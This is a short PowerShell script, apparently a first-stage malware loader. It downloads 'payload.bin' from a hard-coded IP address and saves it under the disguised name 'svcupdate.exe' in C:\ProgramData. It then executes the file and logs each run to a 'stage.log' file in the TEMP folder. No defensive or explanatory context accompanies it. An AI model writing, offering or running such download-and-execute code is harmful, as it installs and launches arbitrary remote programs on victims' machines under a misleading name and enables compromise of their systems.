
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://198.51.100.42/downloads/payload.bin",
    [string]$PayloadPath = 'C:\ProgramData\svcupdate.exe'
)
try { (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath); Start-Process -FilePath $PayloadPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
